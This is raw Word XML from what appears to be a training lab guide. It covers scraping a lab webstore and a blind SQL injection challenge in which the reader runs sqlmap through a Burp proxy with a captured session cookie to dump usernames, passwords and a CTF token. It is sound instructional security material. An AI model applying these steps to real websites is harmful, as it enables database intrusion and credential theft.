                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D9A7762" w14:textId="77777777" w:rsidR="00882FA7" w:rsidRDefault="00882FA7" w:rsidP="00882FA7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>Change the scraping settings in the tool’s GUI to Auto-Catch and Auto-Empty:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79E29EC0" w14:textId="77777777" w:rsidR="00882FA7" w:rsidRPr="001D7D93" w:rsidRDefault="00882FA7" w:rsidP="00882FA7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="20868585" wp14:editId="63BCFA6F">
            <wp:extent cx="2438400" cy="742950"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1542957474" name="Picture 154295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400" cy="742950"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="05F115C7" w14:textId="77777777" w:rsidR="00882FA7" w:rsidRDefault="00882FA7" w:rsidP="00882FA7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>Make sure you tell the tool to Save the images which it finds:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CDD27AC" w14:textId="77777777" w:rsidR="00882FA7" w:rsidRPr="001D7D93" w:rsidRDefault="00882FA7" w:rsidP="00882FA7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="63E05A3A" wp14:editId="105BCCDC">
            <wp:extent cx="4419600" cy="1157605"/>
            <wp:effectExtent l="0" t="0" r="0" b="4445"/>
            <wp:docPr id="1542957475" name="Picture 154295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5641"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4419600" cy="1157605"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B47A3B0" w14:textId="77777777" w:rsidR="00882FA7" w:rsidRPr="00EE4AD7" w:rsidRDefault="00882FA7" w:rsidP="00882FA7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve">train the tool on </w:t>
      </w:r>
      <w:hyperlink r:id="rId34">
        <w:r w:rsidRPr="4C011A90">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          </w:rPr>
          <w:t>https://webstore.f5lab.biz</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34BBA7E2" w14:textId="77777777" w:rsidR="00882FA7" w:rsidRDefault="00882FA7" w:rsidP="00882FA7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5845863F" wp14:editId="7E3C0310">
            <wp:extent cx="4572000" cy="333375"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="154295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1E2450F6" w14:textId="77777777" w:rsidR="00882FA7" w:rsidRDefault="00882FA7" w:rsidP="00882FA7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Hit enter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7242A842" w14:textId="77777777" w:rsidR="00882FA7" w:rsidRDefault="00882FA7" w:rsidP="00882FA7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve">First set of images should show in the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t>OutWit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> Hub GUI.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="023DE357" w14:textId="165136B7" w:rsidR="00882FA7" w:rsidRDefault="00882FA7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
          <w:bCs/>
        </w:rPr>
        <w:t>Important:</w:t>
      </w:r>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="006D31B4">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve">Make the scraper scrape the entire site by following all the site’s </w:t>
      </w:r>
      <w:r w:rsidR="00B47953" w:rsidRPr="006D31B4">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t>links.</w:t>
      </w:r>
      <w:r w:rsidRPr="006D31B4">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> To do this, push the “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t>Autoexplore</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D31B4">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> the links on the page” button</w:t>
      </w:r>
      <w:r w:rsidRPr="006D31B4">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="00076501">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B4741B9" w14:textId="77777777" w:rsidR="00882FA7" w:rsidRDefault="00882FA7" w:rsidP="00882FA7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5F4E7765" wp14:editId="60473DD3">
            <wp:extent cx="4855210" cy="8343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5210" cy="834390"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="13BAB8F1" w14:textId="77777777" w:rsidR="00B16A7C" w:rsidRDefault="00B16A7C" w:rsidP="00B16A7C">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="28" w:name="_Toc487296577"/>
      <w:r>
        <w:t xml:space="preserve">Challenge: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>BlindSQL</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Injection</w:t>
      </w:r>
      <w:bookmarkEnd w:id="28"/>
    </w:p>
    <w:p w14:paraId="59090B1C" w14:textId="77777777" w:rsidR="00655A98" w:rsidRPr="00935C76" w:rsidRDefault="00655A98" w:rsidP="00935C76">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r w:rsidRPr="00935C76">
        <w:t>Blind SQL (Structured Query Language) injection is a type of</w:t>
      </w:r>
      <w:r w:rsidRPr="00935C76">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId37" w:tooltip="SQL Injection" w:history="1">
        <w:r w:rsidRPr="00935C76">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="252525"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>SQL Injection</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00935C76">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00935C76">
        <w:t xml:space="preserve">attack that asks the database true or false questions and determines the answer based on the applications response. This attack is often used when the web application is configured to show generic error </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00935C76">
        <w:t>messages, but</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00935C76">
        <w:t xml:space="preserve"> has not mitigated the code that is vulnerable to SQL injection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AFC0DDC" w14:textId="3327058D" w:rsidR="00655A98" w:rsidRDefault="00655A98" w:rsidP="00D03617">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>When an attacker exploits SQL injection, sometimes the web application displays error messages from the database complaining that the SQL Query's syntax is incorrect. Blind SQL injection is nearly identical to normal</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId38" w:tooltip="SQL Injection" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="0B0080"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>SQL Injection</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>,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impossible.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="684FDF6D" w14:textId="76709DE4" w:rsidR="006C6FD3" w:rsidRDefault="00DA2322" w:rsidP="00D03617">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:rPr>
          <w:color w:val="666666"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:t xml:space="preserve">Putting it together: using SQLMAP with Burp.  If dealing with clear-text http, you can just configure </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:t>sqlmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:t xml:space="preserve"> to proxy thru Burp. If the site you are working with enforces SSL/TLS, within Burp: Proxy </w:t>
      </w:r>
      <w:r w:rsidRPr="00DA2322">
        <w:rPr>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:t xml:space="preserve"> Options </w:t>
      </w:r>
      <w:r w:rsidRPr="00DA2322">
        <w:rPr>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00642A5F">
        <w:rPr>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:t xml:space="preserve">Proxy Listeners </w:t>
      </w:r>
      <w:r w:rsidR="00642A5F" w:rsidRPr="00642A5F">
        <w:rPr>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r w:rsidR="00642A5F">
        <w:rPr>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:t>Request handling, select “Force</w:t>
      </w:r>
      <w:r w:rsidR="001A642C">
        <w:rPr>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:t xml:space="preserve"> Use of SSL</w:t>
      </w:r>
      <w:r w:rsidR="006C6FD3">
        <w:rPr>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AEA3FBE" w14:textId="5D15A2C3" w:rsidR="006C6FD3" w:rsidRPr="00CC5DF8" w:rsidRDefault="006C6FD3" w:rsidP="00D03617">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006C6FD3">
        <w:rPr>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>To force SQLMAP to use burp as a proxy:</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006C6FD3">
        <w:rPr>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue"/>
          <w:color w:val="333333"/>
          <w:shd w:val="clear" w:color="auto" w:fill="999999"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue"/>
          <w:color w:val="333333"/>
          <w:shd w:val="clear" w:color="auto" w:fill="999999"/>
        </w:rPr>
        <w:t>/sqlmap.py -u "http:</w:t>
      </w:r>
      <w:r w:rsidRPr="006C6FD3">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue"/>
          <w:color w:val="333333"/>
          <w:shd w:val="clear" w:color="auto" w:fill="999999"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue"/>
          <w:color w:val="333333"/>
          <w:shd w:val="clear" w:color="auto" w:fill="999999"/>
        </w:rPr>
        <w:t xml:space="preserve">&lt;target URL" </w:t>
      </w:r>
      <w:r w:rsidRPr="006C6FD3">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue"/>
          <w:color w:val="333333"/>
          <w:shd w:val="clear" w:color="auto" w:fill="999999"/>
        </w:rPr>
        <w:t xml:space="preserve"> --proxy "http://127.0.0.1:8080"</w:t>
      </w:r>
      <w:r w:rsidRPr="006C6FD3">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="006C6FD3">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="006C6FD3">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue"/>
          <w:color w:val="333333"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>where -u is target URL, --data is POST data and --proxy is burp proxy details.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B6C61CB" w14:textId="77777777" w:rsidR="00CC5DF8" w:rsidRPr="00CA1E05" w:rsidRDefault="00CC5DF8" w:rsidP="00935C76">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r w:rsidRPr="00CA1E05">
        <w:t>SQL injection/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CA1E05">
        <w:t>BlindSQLI</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CA1E05">
        <w:t xml:space="preserve"> exploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F029ADB" w14:textId="14005D5B" w:rsidR="00CC5DF8" w:rsidRDefault="00CC5DF8" w:rsidP="00D03617">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Web applications front-end access to back-end databases.  Properly built applications will validate the input into form fields.  A client will fill out a web form and the results will be submitted.  With SQL injection exploits, SQL commands are submitted in via the web application forms.  If the application is not validating the input (blocking actual SQL commands), then those will get submitted to the database and results can be returned. When testing a website for SQL injection vulnerabilities, errors may be returned from vulnerable websites that indicate the site is vulnerable and how to exploit it.  Some websites may </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00B47953">
        <w:t>suppresses</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00B47953">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>the error messages however.  This makes SQL injection harder and what leads to Blind SQL injection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01FBA44C" w14:textId="6D0A3363" w:rsidR="00CC5DF8" w:rsidRDefault="00CC5DF8" w:rsidP="00D03617">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>SQLi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> exploits can be performed manually thru a web browser.  While this can be useful to test a website, it can consume time to manually exploit a vulnerable website. This is where </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B47953">
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t>map</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> can be useful as an automated method to make SQL injection easier. The </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>SQLmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> official website says:</w:t>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DDA97D4" w14:textId="472A118A" w:rsidR="00CC5DF8" w:rsidRPr="00211A5A" w:rsidRDefault="00B47953" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00211A5A">
        <w:rPr>
          <w:color w:val="2E2E2E"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>SQLmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CC5DF8" w:rsidRPr="00211A5A">
        <w:rPr>
          <w:color w:val="2E2E2E"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="258DE840" w14:textId="4CE6B209" w:rsidR="00CC5DF8" w:rsidRDefault="00CC5DF8" w:rsidP="00D03617">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The focus of this lab will be on the use of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B47953">
        <w:t>SQLmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> to “map” the database, learning the databases, tables, rows and </w:t>
      </w:r>
      <w:r w:rsidR="00F775E3">
        <w:t>columns</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00F775E3">
        <w:t>Successful</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> completion of this </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">lab will result in retrieval of the usernames and passwords. In the </w:t>
      </w:r>
      <w:r w:rsidR="001F6147">
        <w:t xml:space="preserve">database </w:t>
      </w:r>
      <w:r>
        <w:t>you will find the CTF token.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5013B737" w14:textId="4948D35E" w:rsidR="00CC5DF8" w:rsidRDefault="00CC5DF8" w:rsidP="00D03617">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>Proxying the requests thru Burp Suite will help to see and work thru the exploit.</w:t>
      </w:r>
      <w:r w:rsidR="00EA579B">
        <w:t xml:space="preserve"> Later in this lab you can use Burp Suite to proxy the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B47953">
        <w:t>SQLmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00EA579B">
        <w:t xml:space="preserve"> requests to get a better view of what is </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00EA579B">
        <w:t>actually being</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00EA579B">
        <w:t xml:space="preserve"> sent/received.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36AF5D6E" w14:textId="2F6A0E13" w:rsidR="00EA579B" w:rsidRDefault="00CC5DF8" w:rsidP="00D03617">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Both Burp Suite and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Sqlmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> are tools installed on </w:t>
      </w:r>
      <w:r w:rsidR="00F775E3">
        <w:t>the jump box machine.</w:t>
      </w:r>
      <w:r w:rsidR="00EA579B">
        <w:br/>
        <w:t xml:space="preserve">Burp Suite is a link on the desktop and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B47953">
        <w:t>SQLmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00EA579B">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00EA579B">
        <w:t>is located in</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00EA579B">
        <w:t xml:space="preserve"> c:\sqlmap (as python sqlmap.py)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2091A341" w14:textId="77777777" w:rsidR="00CC5DF8" w:rsidRDefault="00CC5DF8" w:rsidP="00420693">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Executing the exploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E30AAA4" w14:textId="77777777" w:rsidR="00CC5DF8" w:rsidRDefault="00CC5DF8" w:rsidP="00D03617">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Connect to the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>jumpbox</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="064BB48A" w14:textId="5C09A1BD" w:rsidR="00F775E3" w:rsidRDefault="00CC5DF8" w:rsidP="00D03617">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Open </w:t>
      </w:r>
      <w:r w:rsidR="00F775E3">
        <w:t xml:space="preserve">Chrome </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r w:rsidR="00F775E3">
        <w:t>enable the developer tools (Control-Shift-I)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="616E44E4" w14:textId="2BEB8791" w:rsidR="00CC5DF8" w:rsidRPr="00663934" w:rsidRDefault="00CC5DF8" w:rsidP="00D03617">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="001D6BCF">
        <w:t>In order to</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="001D6BCF">
        <w:t xml:space="preserve"> use SQL map, you will need to gather a valid session cookie and the URL to test. </w:t>
      </w:r>
      <w:r w:rsidR="00F775E3" w:rsidRPr="00BB7BA4">
        <w:t>The Chrome developer tools can help with this.  Clicking on the</w:t>
      </w:r>
      <w:r w:rsidR="00F775E3" w:rsidRPr="001F6147">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00EA579B" w:rsidRPr="001F6147">
        <w:t>Application</w:t>
      </w:r>
      <w:r w:rsidR="00F775E3" w:rsidRPr="001F6147">
        <w:t xml:space="preserve"> tab of the developer tools will provide details on the cookies as well as other information,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="003AF37E" w14:textId="336200AC" w:rsidR="00F775E3" w:rsidRDefault="00F775E3" w:rsidP="00F775E3">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="051E8E04" wp14:editId="7B7E5DE3">
            <wp:extent cx="4029075" cy="47021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r="60172"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4034848" cy="4708913"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
